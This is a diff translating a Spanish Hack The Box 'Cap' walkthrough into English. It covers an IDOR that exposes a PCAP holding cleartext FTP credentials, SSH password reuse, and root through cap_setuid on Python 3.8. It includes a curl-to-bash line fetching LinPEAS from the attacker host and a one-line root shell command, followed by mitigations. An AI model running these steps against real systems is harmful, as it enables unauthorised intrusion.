@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: Cap"
 date: 2026-04-14
 draft: false
-description: "Walkthrough completo de la máquina Cap de Hack The Box. Dificultad Easy, OS Linux (Ubuntu 20.04 LTS). IDOR en endpoint de descarga de PCAP, credenciales FTP en texto claro y escalada mediante Linux Capability cap_setuid en Python 3.8."
+description: "Full walkthrough of the Cap machine from Hack The Box. Easy difficulty, Linux (Ubuntu 20.04 LTS). IDOR on a PCAP download endpoint, cleartext FTP credentials, and privilege escalation via Linux Capability cap_setuid on Python 3.8."
 tags: ["HackTheBox", "Linux", "Easy", "IDOR", "FTP", "PCAP", "Wireshark", "LinuxCapabilities", "cap_setuid", "PrivEsc", "cap", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **Cap** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux (Ubuntu 20.04 LTS)**. Explotamos un IDOR en un endpoint de descarga de capturas de red para obtener credenciales FTP en texto claro, accedemos por SSH reutilizando la contraseña, y escalamos a root aprovechando la capability `cap_setuid` asignada al binario de Python 3.8.
+Walkthrough of **Cap** on Hack The Box. **Easy** difficulty machine running **Linux (Ubuntu 20.04 LTS)**. We exploit an IDOR on a network capture download endpoint to obtain cleartext FTP credentials, gain SSH access by reusing the password, and escalate to root by abusing the `cap_setuid` capability assigned to the Python 3.8 binary.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,21 +18,21 @@ Resolución de **Cap** en Hack The Box. Máquina de dificultad **Easy** con sist
 
 ---
 
-## 🗺️ Información de la Máquina
+## 🗺️ Machine Info
 
-| Campo          | Detalle                                                          |
+| Field          | Detail                                                           |
 |----------------|------------------------------------------------------------------|
-| **Nombre**     | Cap                                                              |
+| **Name**       | Cap                                                              |
 | **OS**         | Linux (Ubuntu 20.04 LTS)                                         |
-| **Dificultad** | Easy                                                             |
+| **Difficulty** | Easy                                                             |
 | **IP**         | 10.129.19.177                                                    |
-| **Técnicas**   | IDOR · FTP Cleartext · Credential Reuse · Linux cap_setuid       |
+| **Techniques** | IDOR · FTP Cleartext · Credential Reuse · Linux cap_setuid       |
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### 1.1 Escaneo de Puertos
+### 1.1 Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.19.177
@@ -45,7 +45,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-Escaneo de versiones sobre los puertos abiertos:
+Version scan on open ports:
 
 ```bash
 nmap -sC -sV -p21,22,80 10.129.19.177
@@ -59,62 +59,62 @@ PORT   STATE SERVICE VERSION
 |_http-title: Security Dashboard
 ```
 
-*Puertos abiertos:*
-- `21` → vsftpd 3.0.3 (acceso anónimo deshabilitado — necesitaremos credenciales)
-- `22` → OpenSSH 8.2p1 (disponible para acceso posterior)
-- `80` → Aplicación web Python (Gunicorn) con un "Security Dashboard"
+*Open ports:*
+- `21` → vsftpd 3.0.3 (anonymous access disabled — credentials required)
+- `22` → OpenSSH 8.2p1 (available for later access)
+- `80` → Python web application (Gunicorn) with a "Security Dashboard"
 
-> **💡 Dato clave:** Gunicorn es un servidor WSGI de Python — la aplicación web está escrita en Python. Combinado con el FTP sin acceso anónimo, el vector inicial probablemente pasa por la web.
+> **💡 Key detail:** Gunicorn is a Python WSGI server — the web app is written in Python. Combined with FTP having no anonymous access, the initial vector likely goes through the web.
 
-### 1.2 Enumeración Web — Security Dashboard
+### 1.2 Web Enumeration — Security Dashboard
 
-La aplicación expone un panel de seguridad con varias secciones:
+The application exposes a security dashboard with several sections:
 
-- **Dashboard** — Métricas de eventos de seguridad en tiempo real.
-- **Security Snapshot** — Genera y descarga una captura PCAP de 5 segundos del tráfico de red del servidor.
-- **IP Config** — Muestra la salida de `ifconfig` del servidor.
-- **Network Status** — Estado de la red.
+- **Dashboard** — Real-time security event metrics.
+- **Security Snapshot** — Generates and downloads a 5-second PCAP capture of the server's network traffic.
+- **IP Config** — Shows the server's `ifconfig` output.
+- **Network Status** — Network status.
 
-La sección más interesante es **Security Snapshot**. Al pulsar el botón de descarga, la URL generada es:
+The most interesting section is **Security Snapshot**. When clicking the download button, the generated URL is:
 
 ```
 http://10.129.19.177/data/1
 ```
 
-El número al final es un **ID numérico secuencial** que identifica la captura. La captura actual (ID=1) muestra todo a ceros — fue generada en el momento y no contiene tráfico previo.
+The number at the end is a **sequential numeric ID** identifying the capture. The current capture (ID=1) shows all zeros — it was generated on the spot and contains no prior traffic.
 
-Probamos con **ID=0**, la captura más antigua del servidor:
+We try **ID=0**, the oldest capture on the server:
 
 ```
 http://10.129.19.177/data/0
 ```
 
-La respuesta muestra datos reales: 72 paquetes capturados, 69 TCP. El servidor sirve la captura sin verificar si pertenece a nuestro usuario.
+The response shows real data: 72 packets captured, 69 TCP. The server serves the capture without verifying it belongs to our user.
 
-> **💡 IDOR (Insecure Direct Object Reference):** La aplicación usa IDs predecibles y no valida que el recurso solicitado pertenezca al usuario autenticado. Simplemente cambiar el número en la URL nos da acceso a capturas de otros usuarios o del sistema.
+> **💡 IDOR (Insecure Direct Object Reference):** The application uses predictable IDs and doesn't validate that the requested resource belongs to the authenticated user. Simply changing the number in the URL gives us access to other users' or system captures.
 
 ---
 
-## 2. Explotación — IDOR y Análisis del PCAP
+## 2. Exploitation — IDOR and PCAP Analysis
 
-### 2.1 Análisis de la Vulnerabilidad
+### 2.1 Vulnerability Analysis
 
-El endpoint `/data/<id>` entrega el archivo PCAP correspondiente al ID sin ninguna verificación de autorización. Como los IDs son enteros secuenciales empezando en 0, podemos iterar desde cero para encontrar capturas con tráfico real generado antes de nuestra sesión.
-
-```
-Flujo normal:    usuario genera captura → recibe /data/<su_id>
-Flujo malicioso: atacante solicita /data/0 → recibe captura ajena con tráfico real
-```
-
-### 2.2 Extracción de Credenciales con Wireshark
-
-Descargamos el PCAP del ID=0 y lo abrimos con Wireshark. Filtramos por protocolo FTP:
+The `/data/<id>` endpoint delivers the corresponding PCAP file by ID without any authorization check. Since IDs are sequential integers starting at 0, we can iterate from zero to find captures with real traffic generated before our session.
 
 ```
-Filtro Wireshark: ftp
+Normal flow:    user generates capture → receives /data/<their_id>
+Malicious flow: attacker requests /data/0 → receives someone else's capture with real traffic
 ```
 
-FTP transmite las credenciales en texto claro sin ningún cifrado. En el tráfico capturado vemos el intercambio completo de autenticación:
+### 2.2 Credential Extraction with Wireshark
+
+We download the PCAP from ID=0 and open it in Wireshark. We filter by FTP protocol:
+
+```
+Wireshark filter: ftp
+```
+
+FTP transmits credentials in cleartext with no encryption. In the captured traffic we see the complete authentication exchange:
 
 ```
 → Request:  USER nathan
@@ -123,13 +123,13 @@ FTP transmite las credenciales en texto claro sin ningún cifrado. En el tráfic
 ← Response: 230 Login successful
 ```
 
-> **🔑 Credenciales obtenidas:** `nathan:Buck3tH4TF0RM3!`
+> **🔑 Credentials obtained:** `nathan:Buck3tH4TF0RM3!`
 
 ---
 
 ## 3. User Flag
 
-Las credenciales FTP son un candidato directo para SSH por reutilización de contraseñas — es un error muy frecuente usar la misma contraseña en múltiples servicios del mismo sistema:
+The FTP credentials are a direct candidate for SSH via password reuse — using the same password across multiple services on the same system is a very common mistake:
 
 ```bash
 ssh nathan@10.129.19.177
@@ -145,13 +145,13 @@ nathan@cap:~$
 nathan@cap:~$ cat user.txt
 ```
 
-> 🔑 Flag de usuario obtenida.
+> 🔑 User flag obtained.
 
 ---
 
-## 4. Escalada de Privilegios — Linux Capability `cap_setuid`
+## 4. Privilege Escalation — Linux Capability `cap_setuid`
 
-### 4.1 Enumeración del Sistema
+### 4.1 System Enumeration
 
 ```bash
 nathan@cap:~$ sudo -l
@@ -161,40 +161,40 @@ nathan@cap:~$ id
 uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
 ```
 
-Sin sudo. Ejecutamos LinPEAS para buscar vectores de escalada:
+No sudo. We run LinPEAS to look for escalation vectors:
 
 ```bash
-# En la máquina atacante
+# On the attacking machine
 python3 -m http.server 8000
 
-# En la máquina víctima
+# On the victim machine
 curl -L http://10.10.15.237/linpeas.sh | bash
 ```
 
-LinPEAS detecta algo crítico en la sección de **Linux Capabilities**:
+LinPEAS detects something critical in the **Linux Capabilities** section:
 
 ```
 Files with capabilities:
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
-### 4.2 Análisis del Vector de Escalada
+### 4.2 Escalation Vector Analysis
 
-Las **Linux Capabilities** son un mecanismo del kernel que divide los privilegios de root en unidades más pequeñas y granulares. En lugar de conceder acceso root completo, se puede asignar solo la capacidad específica que un proceso necesita. El problema surge cuando esa capacidad es demasiado poderosa.
+**Linux Capabilities** are a kernel mechanism that breaks down root privileges into smaller, more granular units. Instead of granting full root access, only the specific capability a process needs can be assigned. The problem arises when that capability is too powerful.
 
-La capability **`cap_setuid`** permite al proceso **cambiar su UID efectivo a cualquier valor**, incluido el 0 (root). Al estar asignada al binario `/usr/bin/python3.8`, cualquier script Python ejecutado con ese intérprete puede llamar a `os.setuid(0)` y convertirse en root.
+The **`cap_setuid`** capability allows the process to **change its effective UID to any value**, including 0 (root). Since it's assigned to the `/usr/bin/python3.8` binary, any Python script executed with that interpreter can call `os.setuid(0)` and become root.
 
-Podemos encontrar todos los binarios con capabilities en el sistema con:
+We can find all binaries with capabilities on the system with:
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-> **💡 Diferencia con el bit SUID:** Un binario con SUID siempre ejecuta con el UID del propietario del archivo. Las capabilities son más granulares, pero `cap_setuid` es igual de peligrosa — en la práctica, ambas permiten escalar a root si el binario es un intérprete de scripts como Python.
+> **💡 Difference from SUID bit:** A binary with SUID always executes with the owner's UID. Capabilities are more granular, but `cap_setuid` is equally dangerous — in practice, both allow escalation to root if the binary is a script interpreter like Python.
 
-### 4.3 Explotación
+### 4.3 Exploitation
 
-El exploit se reduce a dos líneas de Python: cambiar el UID efectivo a 0 y abrir una shell con ese contexto.
+The exploit reduces to two lines of Python: change the effective UID to 0 and open a shell in that context.
 
 ```bash
 nathan@cap:~$ python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
@@ -205,7 +205,7 @@ root@cap:~# id
 uid=0(root) gid=1000(nathan) groups=1000(nathan)
 ```
 
-✅ **Shell de root obtenida mediante `cap_setuid` en Python 3.8.**
+✅ **Root shell obtained via `cap_setuid` on Python 3.8.**
 
 ---
 
@@ -215,37 +215,37 @@ uid=0(root) gid=1000(nathan) groups=1000(nathan)
 root@cap:~# cat /root/root.txt
 ```
 
-> 🏁 Flag de root obtenida.
+> 🏁 Root flag obtained.
 
 ---
 
-## 6. Resumen y Lecciones Aprendidas
+## 6. Summary and Lessons Learned
 
-**Ruta de compromiso:**
+**Compromise path:**
 
-1. **Recon** → Puerto 80 con Security Dashboard (Gunicorn/Python); FTP sin acceso anónimo.
-2. **IDOR** → Endpoint `/data/0` sirve PCAP ajeno sin verificar autorización.
-3. **Análisis PCAP** → Wireshark filtra tráfico FTP → credenciales `nathan:Buck3tH4TF0RM3!` en texto claro.
-4. **Foothold** → SSH con credenciales reutilizadas → `user.txt`.
-5. **PrivEsc** → LinPEAS detecta `cap_setuid` en `/usr/bin/python3.8` → `os.setuid(0)` → shell como root → `root.txt`.
+1. **Recon** → Port 80 with Security Dashboard (Gunicorn/Python); FTP with no anonymous access.
+2. **IDOR** → Endpoint `/data/0` serves someone else's PCAP without checking authorization.
+3. **PCAP analysis** → Wireshark filters FTP traffic → credentials `nathan:Buck3tH4TF0RM3!` in cleartext.
+4. **Foothold** → SSH with reused credentials → `user.txt`.
+5. **PrivEsc** → LinPEAS detects `cap_setuid` on `/usr/bin/python3.8` → `os.setuid(0)` → shell as root → `root.txt`.
 
-**Lo que aprendí con esta máquina:**
+**What I learned from this machine:**
 
-- **IDOR es una vulnerabilidad de lógica, no de tecnología.** No requiere ningún exploit complejo — solo cambiar un número en la URL. La defensa tampoco es compleja: verificar en el servidor que el recurso solicitado pertenece al usuario autenticado antes de servirlo. Lo que hace que IDOR sea peligroso es lo invisible que resulta sin una revisión activa del código.
+- **IDOR is a logic vulnerability, not a technology one.** It requires no complex exploit — just changing a number in the URL. The defense isn't complex either: verify server-side that the requested resource belongs to the authenticated user before serving it. What makes IDOR dangerous is how invisible it is without an active code review.
 
-- **FTP transmite credenciales en texto claro — siempre.** No hay modo cifrado en FTP estándar. Cualquier captura de tráfico de red que incluya una sesión FTP contendrá las credenciales legibles directamente. La alternativa es SFTP (SSH File Transfer Protocol) o FTPS (FTP sobre TLS), que cifran la comunicación completa.
+- **FTP transmits credentials in cleartext — always.** There's no encrypted mode in standard FTP. Any network traffic capture containing an FTP session will have the credentials directly readable. The alternative is SFTP (SSH File Transfer Protocol) or FTPS (FTP over TLS), which encrypt the full communication.
 
-- **La reutilización de contraseñas entre servicios del mismo sistema es un multiplicador de riesgo.** Una credencial comprometida en FTP se convirtió en acceso SSH. Política básica: cada servicio debe tener credenciales independientes.
+- **Password reuse across services on the same system is a risk multiplier.** A compromised FTP credential became SSH access. Basic policy: each service must have independent credentials.
 
-- **`cap_setuid` en un intérprete de scripts es equivalente a root.** A diferencia de un binario compilado donde el control de flujo está fijo, un intérprete como Python ejecuta cualquier código arbitrario. Asignar `cap_setuid` a Python es efectivamente dar root a cualquier usuario que pueda ejecutar scripts Python — las capabilities solo son seguras en binarios con funcionalidad muy acotada.
+- **`cap_setuid` on a script interpreter is equivalent to root.** Unlike a compiled binary where the control flow is fixed, an interpreter like Python executes arbitrary code. Assigning `cap_setuid` to Python effectively gives root to any user who can execute Python scripts — capabilities are only safe on binaries with very restricted functionality.
 
-- **LinPEAS y la enumeración de capabilities son pasos obligatorios en PrivEsc de Linux.** Los checks habituales (sudo, SUID, cron) no cubren capabilities. `getcap -r / 2>/dev/null` debería ser siempre parte del checklist de enumeración post-acceso.
+- **LinPEAS and capability enumeration are mandatory steps in Linux PrivEsc.** The usual checks (sudo, SUID, cron) don't cover capabilities. `getcap -r / 2>/dev/null` should always be part of the post-access enumeration checklist.
 
-**Mitigaciones:**
+**Mitigations:**
 
-| Vector | Mitigación |
+| Vector | Mitigation |
 |--------|------------|
-| IDOR en `/data/<id>` | Verificar en el servidor que el ID solicitado pertenece al usuario autenticado antes de servir el archivo |
-| FTP en texto claro | Reemplazar FTP por SFTP o FTPS; nunca transmitir credenciales sin cifrar |
-| Reutilización de contraseñas | Política de credenciales únicas por servicio; gestor de contraseñas |
-| `cap_setuid` en Python 3.8 | Eliminar la capability: `setcap -r /usr/bin/python3.8`; auditar regularmente con `getcap -r /` |
+| IDOR on `/data/<id>` | Verify server-side that the requested ID belongs to the authenticated user before serving the file |
+| FTP in cleartext | Replace FTP with SFTP or FTPS; never transmit credentials unencrypted |
+| Password reuse | Unique credentials policy per service; use a password manager |
+| `cap_setuid` on Python 3.8 | Remove the capability: `setcap -r /usr/bin/python3.8`; audit regularly with `getcap -r /` |
